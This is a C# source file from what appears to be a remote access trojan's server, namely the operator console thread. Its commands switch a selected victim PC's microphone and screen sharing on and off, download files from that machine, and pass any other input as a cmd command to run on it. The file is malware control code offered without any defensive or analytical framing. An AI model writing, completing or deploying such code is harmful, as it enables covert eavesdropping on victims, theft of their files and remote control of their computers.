using ratserver;
using System;

public static class ConsoleThread 
{
    public static void Start()
    {
        while (ServerFunctions.Running) 
        {
            try
            {
                Console.Write(">:");
                string input = Console.ReadLine();
                if (input == "clear")
                {
                    Console.Clear();
                }
                else if (input == "clearbuffers")
                {
                    Console.WriteLine("Clearing tcp buffers:");
                    foreach (Client c in ServerFunctions.Clients)
                        ServerFunctions.ClearBuffer(c);
                }
                else if (input == "clearbuffer")
                {
                    ServerFunctions.ClearBuffer(Form1.selectedPc);
                }
                else if (IsInValues(input, "exit", "close", "quit"))
                {
                    ServerFunctions.Parent.Invoke(new Action(() => ServerFunctions.Parent.Close()));
                    System.Threading.Thread.CurrentThread.Abort();
                    break;
                }
                else if(IsInValues(input, "micon", "micoff"))
                {
                    ServerFunctions.Microphone(Form1.selectedPc, input == "micon");
                }
                else if(IsInValues(input, "screenon", "screenoff"))
                {
                    ServerFunctions.SetShareScreen(Form1.selectedPc, input == "screenon");
                }
                else
                {
                    string[] split = input.Split(' ');
                    if (split[0] == "download")
                    {
                        if (input != "download " && input != "download")
                        {
                            string fileName = input.Substring("download ".Length, input.Length - "download ".Length);
                            if (fileName != "")
                            {
                                ServerFunctions.DownloadFile(Form1.selectedPc, fileName);
                                continue;
                            }
                        }
                        Console.WriteLine("Enter valid file name");
                    }
                    else // EXECUTE CMD
                        ServerFunctions.RunCmdCommand(Form1.selectedPc, input);

                }
            }catch(Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }

    static bool IsInValues(string value, params string[] array) 
    {
        for(int i = 0; i < array.Length; i++)
            if (value == array[i]) return true;
        
        return false;
    }
}